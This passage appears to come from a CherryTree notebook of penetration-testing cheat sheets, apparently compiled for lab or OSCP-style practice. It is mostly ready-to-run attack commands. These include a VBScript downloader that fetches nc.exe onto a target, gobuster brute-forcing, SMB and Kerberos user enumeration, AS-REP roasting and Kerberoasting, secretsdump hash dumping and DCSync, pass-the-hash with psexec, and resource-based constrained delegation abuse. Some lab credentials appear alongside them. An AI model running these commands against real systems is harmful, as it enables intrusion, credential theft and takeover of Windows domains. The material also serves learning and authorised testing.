          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo http.Send </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo varByteArray = http.ResponseBody </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set http = Nothing </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo strData = "" </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo strBuffer = "" </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo Next </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs
echo ts.Close </rich_text>
          <rich_text family="monospace" foreground="#d73a49">&gt;&gt;</rich_text>
          <rich_text family="monospace"> wget.vbs</rich_text>
          <rich_text>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

</rich_text>
          <rich_text underline="single" scale="h2">Download Files</rich_text>
          <rich_text>
</rich_text>
          <rich_text family="monospace">cscript wget.vbs http://192.168.0.1/nc.exe nc.exe</rich_text>
        </node>
      </node>
      <node name="gobuster" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684772533" ts_lastsave="1699312865">
        <rich_text scale="h1">Directory BF
</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h3">Fast Scan (Small List)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h3">Fast Scan (Big List)</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



</rich_text>
        <rich_text scale="h3">Slow Scan (Check File Extensions)</rich_text>
        <rich_text>:

Definitely use it when u see `cgi-bin`  (even with http 403)

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

_______________________________________

</rich_text>
        <rich_text scale="h2">Using Proxy:
</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>



________________________________________

</rich_text>
        <rich_text scale="h2">HTTPS</rich_text>
        <rich_text>

To ignore ssl certificate use </rich_text>
        <rich_text family="monospace">-k </rich_text>
        <rich_text>flag</rich_text>
        <codebox char_offset="38" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.10.84 -w /usr/share/wordlists/dirb/big.txt -t 20 -o gobuster.log</codebox>
        <codebox char_offset="64" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.10.84 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
        <codebox char_offset="167" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir -e -u http://10.10.10.84 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,cgi,sh,bak,aspx -t 20 -o gobuster.log</codebox>
        <codebox char_offset="225" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gobuster dir --proxy http://10.10.10.84:3128 -e -u http://10.10.10.84 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster.log</codebox>
      </node>
      <node name="ssh" unique_id="32" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684867617" ts_lastsave="1707167611">
        <rich_text scale="h2">SSH</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

_____________________________________

</rich_text>
        <rich_text scale="h3">Keygen</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

append to (server)

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

run the following in case

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">connecting:
</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#bf2e5e">ssh</rich_text>
        <rich_text> -o </rich_text>
        <rich_text foreground="#5ebdab">"UserKnownHostsFile=/dev/null"</rich_text>
        <rich_text> -o </rich_text>
        <rich_text foreground="#5ebdab">"StrictHostKeyChecking=no"</rich_text>
        <rich_text> -i temp root@10.10.10.84  -p 22


_____________________________________

</rich_text>
        <rich_text scale="h2">Port-Forwarding:</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


  </rich_text>
        <codebox char_offset="5" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@10.10.10.84 -p 22</codebox>
        <codebox char_offset="55" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh-keygen -t rsa -b 4096</codebox>
        <codebox char_offset="78" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ~/.ssh/authorized_keys</codebox>
        <codebox char_offset="108" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">chmod 600 ~/.ssh/authorized_keys</codebox>
        <codebox char_offset="281" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84</codebox>
      </node>
      <node name="nikto" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687617619" ts_lastsave="1687805895">
        <rich_text scale="h2">Usage
</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h2">using ports</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.10.10.84 | tee output.log</codebox>
        <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nikto -host 10.10.10.84 -port [port number 1], [port number 2], [port number 3]</codebox>
      </node>
      <node name="smb" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687626207" ts_lastsave="1698786658">
        <rich_text scale="h1">Nmap</rich_text>
        <rich_text>


Enumerate shares: 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

vuln scan:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
_____________________________________
</rich_text>
        <rich_text scale="h2">Basics</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">SMBClient copying everything to local</rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


Also check if u can put something in it:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

once put u can check accesing them and try something like this </rich_text>
        <rich_text link="node 98">URI File Attack</rich_text>
        <rich_text>

_________________________________________________

</rich_text>
        <rich_text scale="h1">SMBMap</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

with specific user:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

or anonymous

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

list contents of a directory and subdirectory:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

make sure if the directory has `$` in the end its also in ur directoryName
________________________________________________

</rich_text>
        <rich_text scale="h2">Enum4linux</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

or

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


_________________________________________

</rich_text>
        <rich_text scale="h2">Cadaver</rich_text>
        <rich_text>

Can be used to upload or download from smb shares

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Asks for username
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

To copy from local to remote:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

To copy from remote:

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


____________________________________________

Also check



</rich_text>
        <rich_text link="node 41">CrackMapExec</rich_text>
        <rich_text>

Especially

</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="27" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script smb-enum-shares -p 139,445 10.10.10.84</codebox>
        <codebox char_offset="42" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap --script=smb-vuln* --script-args=unsafe=1 -T5 10.10.10.84</codebox>
        <codebox char_offset="90" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient -N -L 10.10.10.84   </codebox>
        <codebox char_offset="133" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbclient //10.10.10.84/directoryName -U &lt;username&gt;

recurse ON
prompt OFF
mget *</codebox>
        <codebox char_offset="179" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
        <codebox char_offset="321" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.10.84</codebox>
        <codebox char_offset="345" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.10.84 -u &lt;user&gt; -p &lt;pass&gt;</codebox>
        <codebox char_offset="362" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -H 10.10.10.84 -u guest -p &lt;pass&gt;</codebox>
        <codebox char_offset="412" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">smbmap -r DirectoryName -H 10.10.10.84</codebox>
        <codebox char_offset="552" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.10.10.84</codebox>
        <codebox char_offset="559" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -u 'guest' -p '' -a 10.10.10.84</codebox>
        <codebox char_offset="666" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cadaver http://10.10.10.84</codebox>
        <codebox char_offset="687" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Username: &lt;username&gt;
Password: &lt;password&gt;</codebox>
        <codebox char_offset="721" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
        <codebox char_offset="746" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get &lt;filename&gt;</codebox>
        <codebox char_offset="836" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.84 --shares -u '' -p ''</codebox>
      </node>
      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1698812150">
        <rich_text>
</rich_text>
        <rich_text scale="h2">Methodology:</rich_text>
        <rich_text>

☐ </rich_text>
        <rich_text link="node 36">nmap</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 34">smb</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 45">ldapsearch</rich_text>
        <rich_text>
☐ </rich_text>
        <rich_text link="node 89">88 Kerberos Auth</rich_text>
        <rich_text>
☐ checkwinpeas (add any other user or credentials)
☐ if u find </rich_text>
        <rich_text family="monospace">users</rich_text>
        <rich_text> make sure if there are matching users using </rich_text>
        <rich_text family="monospace">net user </rich_text>
        <rich_text>command or/and checking </rich_text>
        <rich_text family="monospace">dir c:/Users</rich_text>
        <rich_text>
☐ use blood hound (check and update priveleges)
☐ DCSync </rich_text>
        <rich_text link="node 100">DACL/DC-Sync</rich_text>
        <rich_text>
☐ run </rich_text>
        <rich_text link="node 85">secretdumps-GetAllHashes</rich_text>
        <rich_text> dump with ur initial set of credentials to get priviliged hashes
_______________________________________________________________



</rich_text>
        <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/active-directory/">https://exploit-notes.hdks.org/exploit/windows/active-directory/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology</rich_text>
        <rich_text>
________________________________________
</rich_text>
        <rich_text link="webs https://zer1t0.gitlab.io/posts/attacking_ad/">https://zer1t0.gitlab.io/posts/attacking_ad/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://tools.thehacker.recipes/">https://tools.thehacker.recipes/</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md">https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md</rich_text>
        <rich_text>
</rich_text>
        <rich_text link="webs https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce">https://gist.github.com/ssstonebraker/a1964b2f20acc8edb239409b6c4906ce</rich_text>
        <rich_text>


Exe files to use for redteam:


</rich_text>
        <rich_text link="webs https://github.com/expl0itabl3/Toolies">https://github.com/expl0itabl3/Toolies</rich_text>
        <node name="88 Kerberos Auth" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1697239770">
          <rich_text>

Check: </rich_text>
          <rich_text link="webs https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a">https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</rich_text>
          <rich_text>

</rich_text>
          <rich_text scale="h1">Kerberos Authentication:</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

____________________________________________________________________________________

</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="109" justification="left" frame_width="1970" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
# make sure u add the domain to the ip in host file
kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100 

or
_______________________________________________________________________

## once u have list of users from ldap search or somewhere else

./kerbrute_linux_amd64 userenum -d hutch.offsec --dc 10.10.10.84 usernames.txt


____________________________________________________________________________________

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" 10.10.10.84
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='&lt;domain&gt;',userdb=/root/Desktop/usernames.txt 10.10.10.84

____________________________________________________________________________________


msf&gt; use auxiliary/gather/kerberos_enumusers

____________________________________________________________________________________


crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq</codebox>
          <codebox char_offset="198" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">

</codebox>
          <node name="ASRreproasting" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687808714" ts_lastsave="1698812222">
            <rich_text scale="h1">Request AS_REP message</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h3">Using Impacket</rich_text>
            <rich_text>



</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or without users:

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
once done either check for :

</rich_text>
            <rich_text link="node 34">smb</rich_text>
            <rich_text> or </rich_text>
            <rich_text link="node 44">Using Bloodhound</rich_text>
            <rich_text> python for more data 

or

</rich_text>
            <rich_text link="node 95">evilwinrm</rich_text>
            <rich_text>  for access with the cracked password

or </rich_text>
            <rich_text link="node 102">RPCClient</rich_text>
            <rich_text> </rich_text>
            <codebox char_offset="42" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">#Try all the usernames in usernames.txt
impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.84
#Use domain creds to extract targets and target them
impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.84

or

impacket-GetNPUsers spookysec.local/svc-admin -no-pass


or

impacket-GetNPUsers domain.local/admin -request -no-pass -dc-ip 10.10.10.84
</codebox>
            <codebox char_offset="63" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetNPUsers blackfield.local/ -dc-ip 10.10.10.84</codebox>
            <codebox char_offset="69" justification="left" frame_width="1682" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)

</codebox>
          </node>
          <node name="Kerberoasting" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697239770" ts_lastsave="1697242037">
            <rich_text>• </rich_text>
            <rich_text link="webs https://adsecurity.org/?p=3458">https://adsecurity.org/?p=3458</rich_text>
            <rich_text>
• </rich_text>
            <rich_text link="webs https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/">https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/</rich_text>
            <rich_text>
• </rich_text>
            <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast</rich_text>
            <rich_text>


</rich_text>
            <rich_text scale="h2">Via Impacket</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


or


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


once done we can crack it using john

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


once we get the password we should use psexec to get a shell

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
Ex:
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="224" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -hashes &lt;lmhash&gt;:&lt;nthash&gt; htb.local/username -outputfile hashes.txt</codebox>
            <codebox char_offset="233" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-ip 10.10.10.84 &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -outputfile hashes.kerberoast</codebox>
            <codebox char_offset="275" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt</codebox>
            <codebox char_offset="341" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /&lt;user&gt;:&lt;Password&gt;@10.10.10.84</codebox>
            <codebox char_offset="347" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /Administrator:Ticketmaster1968@10.10.10.84</codebox>
          </node>
        </node>
        <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1690043804">
          <node name="GetNPUsers-ASRreproasting" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1689882873">
            <rich_text scale="h1">Request AS_REP message</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h3">Using Impacket</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">###Try all the usernames in usernames.txt
impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

### Use domain creds to extract targets and target them
impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast


### Get  ASREPMessage without pass  
impacket-GetNPUsers spookysec.local/svc-admin -no-pass


or

python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 10.10.10.84
</codebox>
          </node>
          <node name="secretdumps-GetAllHashes" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1689887987">
            <rich_text>
</rich_text>
            <rich_text foreground="#569cd6" weight="heavy">### Dump All password hashes from a user account</rich_text>
            <rich_text> (DC Sync aka synchronizing DC)


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

___________________________________________________________

</rich_text>
            <rich_text scale="h2">Getting All the hashes via ntds.dit files</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

ex:


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <codebox char_offset="83" justification="left" frame_width="850" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -just-dc backup@spookysec.local
or 
impacket-secretsdump domain.local/user@10.10.10.84</codebox>
            <codebox char_offset="190" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -ntds &lt;ntds.dit&gt; -system &lt;SYSTEM&gt; LOCAL</codebox>
            <codebox char_offset="199" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -ntds temp/ntds.dit -system temp/SYSTEM LOCAL</codebox>
          </node>
          <node name="psexec - Passthe HAsh" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690770">
            <rich_text>Exploitation via pass the hash



</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text foreground="#d4d4d4">or</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


</rich_text>
            <codebox char_offset="34" justification="left" frame_width="1314" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.10.10.84 -hashes randomLMHASH:oeasdNTLMHASH
</codebox>
            <codebox char_offset="41" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo python2 psexec.py /administrator:Password123@10.10.10.84 </codebox>
            <codebox char_offset="49" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /administrator:Password123@10.10.10.84</codebox>
          </node>
          <node name="GetADUsers-enumerating Data from users" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690774">
            <rich_text>
</rich_text>
            <rich_text foreground="#79c0ff" weight="heavy">### This script will gather data about the domain's users and their corresponding email addresses.</rich_text>
            <rich_text>
</rich_text>
            <rich_text foreground="#c9d1d9">```</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <rich_text foreground="#c9d1d9">```</rich_text>
            <rich_text>
or

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GetADUsers.py domain/user:password@IP
or
impacket-GetADUsers domain/user:password@IP</codebox>
            <codebox char_offset="114" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GETADUsers -all domain.local/user -dc-ip 10.10.10.84</codebox>
          </node>
          <node name="GetUserSPNs - get TGTs" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690781">
            <rich_text>
</rich_text>
            <rich_text scale="h3">Get TGT for kerberoastable users</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.10.10.84 domain.local/user</codebox>
          </node>
          <node name="impacket-addcomputer" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690042606" ts_lastsave="1690043170">
            <rich_text>
</rich_text>
            <rich_text scale="h3">Resource Based Constrained Delegation</rich_text>
            <rich_text>
&#13;Let's use our access with the </rich_text>
            <rich_text family="monospace">l.livingstone</rich_text>
            <rich_text> account to create a new machine account on the domain. We can do with by using </rich_text>
            <rich_text family="monospace">impacket-addcomputer</rich_text>
            <rich_text>.
&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>&#13;We can verify that this machine account was added to the domain by using our </rich_text>
            <rich_text family="monospace">evil-winrm</rich_text>
            <rich_text> session from before.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>



With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of </rich_text>
            <rich_text link="webs https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py">rbcd.py</rich_text>
            <rich_text> and use it to set </rich_text>
            <rich_text family="monospace">msDS-AllowedToActOnBehalfOfOtherIdentity</rich_text>
            <rich_text> on our new machine account.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>&#13;We can confirm that this was successful by using our </rich_text>
            <rich_text family="monospace">evil-winrm</rich_text>
            <rich_text> session.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
